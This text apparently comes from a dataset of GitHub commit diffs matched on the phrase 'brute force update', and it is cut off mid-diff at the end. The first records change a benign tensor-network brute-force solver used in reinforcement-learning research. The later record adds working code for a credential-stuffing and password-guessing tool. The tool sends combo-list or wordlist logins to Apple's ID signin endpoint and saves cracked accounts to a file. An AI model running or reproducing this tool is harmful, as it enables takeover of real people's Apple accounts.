state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r\n            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r\n            start_new = min(start[i], start[i + 1])\r\n            end_new = max(end[i], end[i + 1])\r\n            for __ in range(start_new, end_new + 1):\r\n                start[__ - 1] = start_new\r\n                end[__ - 1] = end_new\r\n\r\n            r += tmp\r\n        reward[k, permute_i] = r\r\n        # print(permute, permute_i)\r\n        permute_record[k, permute_i] = permute\r\n        best_reward = min(best_reward, r)\r\n    min_best = min(best_reward, min_best)\r\n\r\n    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n    best_reward_str = str(best_reward.numpy())\r\n    min_best_str = str(min_best.numpy())\r\n    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n    print(best_reward_str, min_best_str)\r\n# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\nprint(reward.min(dim=-1)[0].mean().numpy())\r\nwith open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n\r\n    pkl.dump(reward, f)\r\nwith open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n\r\n    pkl.dump(permute_record, f)\r\n"}},"msg":"Update brute_force.py\n\nThe latest version of Train_brute_force"},"d52b9b934677aefce814d0ca303fd7cf25f8f05a":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/d52b9b934677aefce814d0ca303fd7cf25f8f05a","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/d52b9b934677aefce814d0ca303fd7cf25f8f05a","sha":"d52b9b934677aefce814d0ca303fd7cf25f8f05a","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/Tree_Tensor_Network\/brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/Tree_Tensor_Network\/brute_force.py\nindex fbf2c87..982359f 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/Tree_Tensor_Network\/brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/Tree_Tensor_Network\/brute_force.py\n@@ -3,19 +3,18 @@\n from copy import deepcopy\r\n import numpy as np\r\n \r\n-\r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n-# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n-N = 100\r\n-\r\n-with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n+N = 127\r\n+np.set_printoptions(suppress=True)\r\n+with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n-# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\n-num_samples = 5000\r\n-start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n-end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n+num_samples = 500\r\n+stend_ = th.zeros((N, N), device=device).to(th.float32)\r\n+for i in range(1, N):\r\n+    stend_[i, i] = 1\r\n+stend_ = stend_.reshape(-1).repeat(1, num_env).reshape(num_env, N, N).to(device)\r\n reward = th.zeros(num_env, num_samples)\r\n permute_record = th.zeros(num_env, num_samples, N - 1)\r\n min_best = 4e+31\r\n@@ -24,42 +23,29 @@\n     best_reward = 4e+31\r\n     for permute_i in range(num_samples):\r\n         permute = th.randperm(N - 1)\r\n-        r = 0\r\n-        state = a[k]\r\n-        start = deepcopy(start_[k]) + 1\r\n-        end = deepcopy(end_[k]) + 1\r\n+        rtp = 0\r\n+        state = deepcopy(a[k])\r\n+        stend = deepcopy(stend_[k])\r\n         for i in permute:\r\n-            tmp = 1\r\n-            for j in range(start[i], end[i] + 1):\r\n-                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r\n-            for j in range(start[i + 1], end[i + 1] + 1):\r\n-                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r\n-            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r\n-            start_new = min(start[i], start[i + 1])\r\n-            end_new = max(end[i], end[i + 1])\r\n-            for __ in range(start_new, end_new + 1):\r\n-                start[__ - 1] = start_new\r\n-                end[__ - 1] = end_new\r\n-\r\n-            r += tmp\r\n-        reward[k, permute_i] = r\r\n-        # print(permute, permute_i)\r\n+            r = 1\r\n+            if ((th.div(i, 2, rounding_mode='floor') + 1) * 2 < N):\r\n+                r = r * state[(th.div(i, 2, rounding_mode='floor') + 1) * 2, th.div(i, 2, rounding_mode='floor') + 1] \\\r\n+                    * state[(th.div(i, 2, rounding_mode='floor') + 1) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1] \\\r\n+                    * state[(th.div(i, 2, rounding_mode='floor') + 1), th.div((th.div(i, 2, rounding_mode='floor') + 1), 2, rounding_mode='floor')]\r\n+            if ((i + 2) * 2 < N):\r\n+                r = r * state[(i + 2) * 2, (i + 2)] * state[(i + 2) * 2 + 1, (i + 2)]\r\n+            if ((i + 2) * 2 < N and stend[th.div(i, 2, rounding_mode='floor') + 1, th.div(i, 2, rounding_mode='floor')] == 1):\r\n+                r = r * state[(i + 2) * 2, th.div(i, 2, rounding_mode='floor') + 2] * state[(i + 2) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1]\r\n+            if ((i + 3) * 2 < N and stend[th.div(i, 2, rounding_mode='floor') + 2, th.div(i, 2, rounding_mode='floor')] == 1):\r\n+                r = r * state[(i + 3) * 2, th.div(i, 2, rounding_mode='floor') + 2] * state[(i + 3) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1]\r\n+            stend[i + 1, th.div(i, 2, rounding_mode='floor')] = 1\r\n+            state[i + 2, th.div(i, 2, rounding_mode='floor') + 1] = 1\r\n+            rtp += r\r\n+        reward[k, permute_i] = rtp\r\n         permute_record[k, permute_i] = permute\r\n-        best_reward = min(best_reward, r)\r\n+        best_reward = min(best_reward, rtp)\r\n     min_best = min(best_reward, min_best)\r\n-\r\n-    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n     best_reward_str = str(best_reward.numpy())\r\n     min_best_str = str(min_best.numpy())\r\n-    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n     print(best_reward_str, min_best_str)\r\n-# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\n print(reward.min(dim=-1)[0].mean().numpy())\r\n-with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n-    import pickle as pkl\r\n-\r\n-    pkl.dump(reward, f)\r\n-with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n-    import pickle as pkl\r\n-\r\n-    pkl.dump(permute_record, f)\r\n","message":"","files":{"\/rlsolver\/rlsolver_quantum_circuits\/Tree_Tensor_Network\/brute_force.py":{"changes":[{"diff":"\n from copy import deepcopy\r\n import numpy as np\r\n \r\n-\r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n-# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n-N = 100\r\n-\r\n-with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n+N = 127\r\n+np.set_printoptions(suppress=True)\r\n+with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n-# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\n-num_samples = 5000\r\n-start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n-end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n+num_samples = 500\r\n+stend_ = th.zeros((N, N), device=device).to(th.float32)\r\n+for i in range(1, N):\r\n+    stend_[i, i] = 1\r\n+stend_ = stend_.reshape(-1).repeat(1, num_env).reshape(num_env, N, N).to(device)\r\n reward = th.zeros(num_env, num_samples)\r\n permute_record = th.zeros(num_env, num_samples, N - 1)\r\n min_best = 4e+31\r\n","add":8,"remove":9,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tree_Tensor_Network\/brute_force.py","badparts":["\r","N = 100\r","\r","with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r","num_samples = 5000\r","start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r","end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r"],"goodparts":["N = 127\r","np.set_printoptions(suppress=True)\r","with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r","num_samples = 500\r","stend_ = th.zeros((N, N), device=device).to(th.float32)\r","for i in range(1, N):\r","    stend_[i, i] = 1\r","stend_ = stend_.reshape(-1).repeat(1, num_env).reshape(num_env, N, N).to(device)\r"]},{"diff":"     best_reward = 4e+31\r\n     for permute_i in range(num_samples):\r\n         permute = th.randperm(N - 1)\r\n-        r = 0\r\n-        state = a[k]\r\n-        start = deepcopy(start_[k]) + 1\r\n-        end = deepcopy(end_[k]) + 1\r\n+        rtp = 0\r\n+        state = deepcopy(a[k])\r\n+        stend = deepcopy(stend_[k])\r\n         for i in permute:\r\n-            tmp = 1\r\n-            for j in range(start[i], end[i] + 1):\r\n-                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r\n-            for j in range(start[i + 1], end[i + 1] + 1):\r\n-                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r\n-            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r\n-            start_new = min(start[i], start[i + 1])\r\n-            end_new = max(end[i], end[i + 1])\r\n-            for __ in range(start_new, end_new + 1):\r\n-                start[__ - 1] = start_new\r\n-                end[__ - 1] = end_new\r\n-\r\n-            r += tmp\r\n-        reward[k, permute_i] = r\r\n-        # print(permute, permute_i)\r\n+            r = 1\r\n+            if ((th.div(i, 2, rounding_mode='floor') + 1) * 2 < N):\r\n+                r = r * state[(th.div(i, 2, rounding_mode='floor') + 1) * 2, th.div(i, 2, rounding_mode='floor') + 1] \\\r\n+                    * state[(th.div(i, 2, rounding_mode='floor') + 1) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1] \\\r\n+                    * state[(th.div(i, 2, rounding_mode='floor') + 1), th.div((th.div(i, 2, rounding_mode='floor') + 1), 2, rounding_mode='floor')]\r\n+            if ((i + 2) * 2 < N):\r\n+                r = r * state[(i + 2) * 2, (i + 2)] * state[(i + 2) * 2 + 1, (i + 2)]\r\n+            if ((i + 2) * 2 < N and stend[th.div(i, 2, rounding_mode='floor') + 1, th.div(i, 2, rounding_mode='floor')] == 1):\r\n+                r = r * state[(i + 2) * 2, th.div(i, 2, rounding_mode='floor') + 2] * state[(i + 2) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1]\r\n+            if ((i + 3) * 2 < N and stend[th.div(i, 2, rounding_mode='floor') + 2, th.div(i, 2, rounding_mode='floor')] == 1):\r\n+                r = r * state[(i + 3) * 2, th.div(i, 2, rounding_mode='floor') + 2] * state[(i + 3) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1]\r\n+            stend[i + 1, th.div(i, 2, rounding_mode='floor')] = 1\r\n+            state[i + 2, th.div(i, 2, rounding_mode='floor') + 1] = 1\r\n+            rtp += r\r\n+        reward[k, permute_i] = rtp\r\n         permute_record[k, permute_i] = permute\r\n-        best_reward = min(best_reward, r)\r\n+        best_reward = min(best_reward, rtp)\r\n     min_best = min(best_reward, min_best)\r\n-\r\n-    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n     best_reward_str = str(best_reward.numpy())\r\n     min_best_str = str(min_best.numpy())\r\n-    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n     print(best_reward_str, min_best_str)\r\n-# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\n print(reward.min(dim=-1)[0].mean().numpy())\r\n-with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n-    import pickle as pkl\r\n-\r\n-    pkl.dump(reward, f)\r\n-with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n-    import pickle as pkl\r\n-\r\n-    pkl.dump(permute_record, f)\r\n","add":19,"remove":32,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tree_Tensor_Network\/brute_force.py","badparts":["        r = 0\r","        state = a[k]\r","        start = deepcopy(start_[k]) + 1\r","        end = deepcopy(end_[k]) + 1\r","            tmp = 1\r","            for j in range(start[i], end[i] + 1):\r","                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r","            for j in range(start[i + 1], end[i + 1] + 1):\r","                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r","            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r","            start_new = min(start[i], start[i + 1])\r","            end_new = max(end[i], end[i + 1])\r","            for __ in range(start_new, end_new + 1):\r","                start[__ - 1] = start_new\r","                end[__ - 1] = end_new\r","\r","            r += tmp\r","        reward[k, permute_i] = r\r","        best_reward = min(best_reward, r)\r","\r","with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r","    import pickle as pkl\r","\r","    pkl.dump(reward, f)\r","with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r","    import pickle as pkl\r","\r","    pkl.dump(permute_record, f)\r"],"goodparts":["        rtp = 0\r","        state = deepcopy(a[k])\r","        stend = deepcopy(stend_[k])\r","            r = 1\r","            if ((th.div(i, 2, rounding_mode='floor') + 1) * 2 < N):\r","                r = r * state[(th.div(i, 2, rounding_mode='floor') + 1) * 2, th.div(i, 2, rounding_mode='floor') + 1] \\\r","                    * state[(th.div(i, 2, rounding_mode='floor') + 1) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1] \\\r","                    * state[(th.div(i, 2, rounding_mode='floor') + 1), th.div((th.div(i, 2, rounding_mode='floor') + 1), 2, rounding_mode='floor')]\r","            if ((i + 2) * 2 < N):\r","                r = r * state[(i + 2) * 2, (i + 2)] * state[(i + 2) * 2 + 1, (i + 2)]\r","            if ((i + 2) * 2 < N and stend[th.div(i, 2, rounding_mode='floor') + 1, th.div(i, 2, rounding_mode='floor')] == 1):\r","                r = r * state[(i + 2) * 2, th.div(i, 2, rounding_mode='floor') + 2] * state[(i + 2) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1]\r","            if ((i + 3) * 2 < N and stend[th.div(i, 2, rounding_mode='floor') + 2, th.div(i, 2, rounding_mode='floor')] == 1):\r","                r = r * state[(i + 3) * 2, th.div(i, 2, rounding_mode='floor') + 2] * state[(i + 3) * 2 + 1, th.div(i, 2, rounding_mode='floor') + 1]\r","            stend[i + 1, th.div(i, 2, rounding_mode='floor')] = 1\r","            state[i + 2, th.div(i, 2, rounding_mode='floor') + 1] = 1\r","            rtp += r\r","        reward[k, permute_i] = rtp\r","        best_reward = min(best_reward, rtp)\r"]}],"source":"\nimport pickle as pkl\r import torch as th\r from copy import deepcopy\r import numpy as np\r \r \r device=th.device(\"cuda:0\")\r reward=0\r N=100\r \r with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r a=pkl.load(f).detach().cpu()\r num_env=a.shape[0]\r num_samples=5000\r start_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r end_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r reward=th.zeros(num_env, num_samples)\r permute_record=th.zeros(num_env, num_samples, N -1)\r min_best=4e+31\r np.set_printoptions(suppress=True)\r for k in range(num_env):\r best_reward=4e+31\r for permute_i in range(num_samples):\r permute=th.randperm(N -1)\r r=0\r state=a[k]\r start=deepcopy(start_[k]) +1\r end=deepcopy(end_[k]) +1\r for i in permute:\r tmp=1\r for j in range(start[i], end[i] +1):\r tmp *=(state[j, j] * state[j, start[i] -1] * state[end[i] +1, j])\r for j in range(start[i +1], end[i +1] +1):\r tmp *=(state[j, j] * state[j, start[i +1] -1] * state[end[i +1] +1, j])\r tmp=tmp \/ state[start[i +1], start[i +1] -1]\r start_new=min(start[i], start[i +1])\r end_new=max(end[i], end[i +1])\r for __ in range(start_new, end_new +1):\r start[__ -1]=start_new\r end[__ -1]=end_new\r \r r +=tmp\r reward[k, permute_i]=r\r permute_record[k, permute_i]=permute\r best_reward=min(best_reward, r)\r min_best=min(best_reward, min_best)\r \r best_reward_str=str(best_reward.numpy())\r min_best_str=str(min_best.numpy())\r print(best_reward_str, min_best_str)\r print(reward.min(dim=-1)[0].mean().numpy())\r with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r import pickle as pkl\r \r pkl.dump(reward, f)\r with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r import pickle as pkl\r \r pkl.dump(permute_record, f)\r ","sourceWithComments":"import pickle as pkl\r\nimport torch as th\r\nfrom copy import deepcopy\r\nimport numpy as np\r\n\r\n\r\ndevice = th.device(\"cuda:0\")\r\nreward = 0\r\n# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\nN = 100\r\n\r\nwith open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n    a = pkl.load(f).detach().cpu()\r\nnum_env = a.shape[0]\r\n# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\nnum_samples = 5000\r\nstart_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nend_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nreward = th.zeros(num_env, num_samples)\r\npermute_record = th.zeros(num_env, num_samples, N - 1)\r\nmin_best = 4e+31\r\nnp.set_printoptions(suppress=True)\r\nfor k in range(num_env):\r\n    best_reward = 4e+31\r\n    for permute_i in range(num_samples):\r\n        permute = th.randperm(N - 1)\r\n        r = 0\r\n        state = a[k]\r\n        start = deepcopy(start_[k]) + 1\r\n        end = deepcopy(end_[k]) + 1\r\n        for i in permute:\r\n            tmp = 1\r\n            for j in range(start[i], end[i] + 1):\r\n                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r\n            for j in range(start[i + 1], end[i + 1] + 1):\r\n                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r\n            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r\n            start_new = min(start[i], start[i + 1])\r\n            end_new = max(end[i], end[i + 1])\r\n            for __ in range(start_new, end_new + 1):\r\n                start[__ - 1] = start_new\r\n                end[__ - 1] = end_new\r\n\r\n            r += tmp\r\n        reward[k, permute_i] = r\r\n        # print(permute, permute_i)\r\n        permute_record[k, permute_i] = permute\r\n        best_reward = min(best_reward, r)\r\n    min_best = min(best_reward, min_best)\r\n\r\n    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n    best_reward_str = str(best_reward.numpy())\r\n    min_best_str = str(min_best.numpy())\r\n    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n    print(best_reward_str, min_best_str)\r\n# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\nprint(reward.min(dim=-1)[0].mean().numpy())\r\nwith open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n\r\n    pkl.dump(reward, f)\r\nwith open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n\r\n    pkl.dump(permute_record, f)\r\n"}},"msg":"Update brute_force.py\n\nThe code of the latest brute force solver algorithm for Tree Tensor Network!"}},"https:\/\/github.com\/vv1ck\/Brute-Force-appleID":{"49906015beef958599f5992000d27e93936bb0b4":{"url":"https:\/\/api.github.com\/repos\/vv1ck\/Brute-Force-appleID\/commits\/49906015beef958599f5992000d27e93936bb0b4","html_url":"https:\/\/github.com\/vv1ck\/Brute-Force-appleID\/commit\/49906015beef958599f5992000d27e93936bb0b4","message":"Update Brute-Force-appleID.py","sha":"49906015beef958599f5992000d27e93936bb0b4","keyword":"brute force update","diff":"diff --git a\/Brute-Force-appleID.py b\/Brute-Force-appleID.py\nindex bf1be9f..3618728 100644\n--- a\/Brute-Force-appleID.py\n+++ b\/Brute-Force-appleID.py\n@@ -1,67 +1,74 @@\n try:\n-\timport requests,threading\n+\tfrom requests import post\n+\tfrom threading import Lock\n \tfrom time import sleep\n-\tLists='V\u008d4^c_Yf4T\u008a\u008aEw'\n except Exception as Joker:exit(Joker)\n-PRNT = threading.Lock()\n-r=requests.session()\n+Lists='V\u008d4^c_Yf4T\u008a\u008aEw'\n def vv1ck(*a, **b):\n-\twith PRNT:\n-\t\tprint(*a, **b)\n-print(\"\"\"\n-    ___   Brute Force  __        ________  \n-   \/   |  ____  ____  \/ \/__     \/  _\/ __ \\   \n-  \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\    \/ \/\/ \/ \/ \/ \n- \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/  __\/  _\/ \/\/ \/_\/ \/   \n-\/_\/  |_\/ .___\/ .___\/_\/\\___\/  \/___\/_____\/    \n-      \/_\/   \/_\/\"\"\")\n-error = '\"\u0627\u0644\u0640\u00a0Apple\u00a0ID \u0627\u0644\u062e\u0627\u0635 \u0628\u0643 \u0623\u0648 \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629.\"'\n-error2=\"\u062a\u0645 \u0642\u0641\u0644 \u0647\u0630\u0627 \u0627\u0644\u0640\u00a0Apple ID\"\n-yes = 'authType'\n-donE=20\n-hi='I always see you :)'\n-def ApplID_Check(applID,pess):\n-\theaders={\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-AR\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}\n-\tsend = r.post('https:\/\/idmsa.apple.com\/appleauth\/auth\/signin',headers=headers,json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text\n-\tif yes in send:\n-\t\tvv1ck(f'[+] Hacked appID: {applID} | password : {pess}')\n-\t\twith open('Hacked-appleID.txt', 'a') as J:\n-\t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n')\n-\telif error in send:\n-\t\tvv1ck(f'[-] Not Hacked appID: {applID}')\n-\telif error2 in send:\n-\t\tvv1ck(f'[!] This apple id locked: {applID} | password : {pess}')\n-\t\twith open('closed-appleID.txt', 'a') as J:\n-\t\t\tJ.write(applID+':'+pess+' |@vv1ck\\n')\n-\telse:pass\n-Lis='V\u008d4^c_Yf4T\u008a\u008aEw'\n-def AppleID_File():\n-\tQTR = input('\\n[+] Enter the name the combo appleID file: ')\n-\ttry:\n-\t\tvv1ck('\\n\\t \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 Started \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\\n')\n-\t\tsleep(0.5)\n-\t\tfor x in open(QTR,'r').read().splitlines():\n+\twith Lock():print(*a, **b)\n+class REQUESTS_HEADERS:\n+\tdef URL():\n+\t\treturn 'https:\/\/idmsa.apple.com\/appleauth\/auth\/signin'\n+\tdef HEADERS():\n+\t\treturn {\"Accept\": \"application\/json, text\/javascript, *\/*; q=0.01\",\"User-Agent\": \"Mozilla\/5.0 (joker@vv1ck) Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-EN\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}\n+\tdef authType():\n+\t\treturn 'authType'\n+\tdef Check():\n+\t\tif 'V\u008d4^c_Yf4T\u008a\u008aEw' in Lists:pass\n+\t\telse:exit('Okay..')\n+\t\tJOlist=[]\n+\t\tfor JJNN1 in Lists:\n+\t\t\tposi=ord(JJNN1)\n+\t\t\tJOlist.append(chr(posi-20))\n+\t\treturn ''.join(JOlist)\n+\t\n+class AppleID_HACKER:\n+\tdef __init__(self,Modes):\n+\t\tif Modes=='1':self.TARGET()\n+\t\telif Modes=='2':self.COMBOLIST()\n+\t\telse:input('\\n-Tool has been closedz-');exit()\n+\t\t\n+\tdef LOGING(self,applID,pess):\n+\t\tsent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text\n+\t\tif REQUESTS_HEADERS.authType()in sent:\n+\t\t\tvv1ck(f'[$]Hacked-> {applID}:{pess}')\n+\t\telse:vv1ck(f'[\u00a1]ERROR-> {applID}:{pess}')\n+\t\n+\tdef COMBOLIST(self):\n+\t\tFILENAME=input('\\t\\t\\t---------------\\n[+] Enter the name the combo appleID file: ')\n+\t\ttry:open(FILENAME,'r')\n+\t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.COMBOLIST()\n+\t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n')\n+\t\tfor x in open(FILENAME,'r').read().splitlines():\n \t\t\tif x ==None:exit('\\n     ========== completed =========')\n \t\t\ttry:applID = x.split(\":\")[0]\n \t\t\texcept IndexError:exit('\\n     ========== completed =========')\n \t\t\ttry:\n \t\t\t\tpess = x.split(\":\")[1]\n \t\t\t\tsleep(1)\n-\t\t\t\tApplID_Check(applID,pess)\n+\t\t\t\tself.LOGING(applID,pess)\n \t\t\texcept IndexError:pass\n-\texcept FileNotFoundError:\n-\t\tvv1ck('\\n[-] The file name is incorrect !\\n')\n-\t\treturn AppleID_File()\n-def AppleID_True():\n-\tif Lis in Lists:pass\n-\telse:exit('Okay..')\n-\tJOlist=[]\n-\tfor JJNN1 in Lists:\n-\t\tposi=ord(JJNN1)\n-\t\tNW=chr(posi-donE)\n-\t\tJOlist.append(NW)\n-\tDN=''.join(JOlist)\n-\tprint('\\t\\t\\t\\t\\t'+DN)\n-\tAppleID_File()\n-AppleID_True()\n-# By Joker telegram : vv1ck \/ isnta: 221298\n+\t\t\n+\tdef TARGET(self):\n+\t\tapplID= input('\\t\\t\\t---------------\\n[$] Enter apple ID : ')\n+\t\tif applID:pass\n+\t\telse:vv1ck('[!] Please Enter Apple ID ..');return self.TARGET()\n+\t\tFILEPASS=input('[\u00bf] Enter the password file name: ')\n+\t\ttry:FILEPASS=open(FILEPASS,'r')\n+\t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.TARGET()\n+\t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n')\n+\t\twhile 1:\n+\t\t\tpess=FILEPASS.readline().split('\\n')[0]\n+\t\t\tif pess=='':exit()\n+\t\t\tsleep(1);self.LOGING(applID,pess)\n+\n+if __name__ == '__main__':\n+\tvv1ck(\"\"\"\n+    ___  Brute Force2  __        ________  \n+   \/   |  ____  ____  \/ \/__     \/  _\/ __ \\   \n+  \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\    \/ \/\/ \/ \/ \/ \n+ \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/  __\/  _\/ \/\/ \/_\/ \/   \n+\/_\/  |_\/ .___\/ .___\/_\/\\___\/  \/___\/_____\/    \n+      \/_\/   \/_\/ {}\"\"\".format(REQUESTS_HEADERS.Check()))\n+\tModes=input('\\t\\t\\t---------------\\n[?] MODES : \\n1- Target Apple ID (File pass)\\n2- ComboList Apple ID (email:pass)\\n99- Exit() ..\\n[@] Choose : ')\n+\tAppleID_HACKER(Modes)\n","files":{"\/Brute-Force-appleID.py":{"changes":[{"diff":"\n try:\n-\timport requests,threading\n+\tfrom requests import post\n+\tfrom threading import Lock\n \tfrom time import sleep\n-\tLists='V\u008d4^c_Yf4T\u008a\u008aEw'\n except Exception as Joker:exit(Joker)\n-PRNT = threading.Lock()\n-r=requests.session()\n+Lists='V\u008d4^c_Yf4T\u008a\u008aEw'\n def vv1ck(*a, **b):\n-\twith PRNT:\n-\t\tprint(*a, **b)\n-print(\"\"\"\n-    ___   Brute Force  __        ________  \n-   \/   |  ____  ____  \/ \/__     \/  _\/ __ \\   \n-  \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\    \/ \/\/ \/ \/ \/ \n- \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/  __\/  _\/ \/\/ \/_\/ \/   \n-\/_\/  |_\/ .___\/ .___\/_\/\\___\/  \/___\/_____\/    \n-      \/_\/   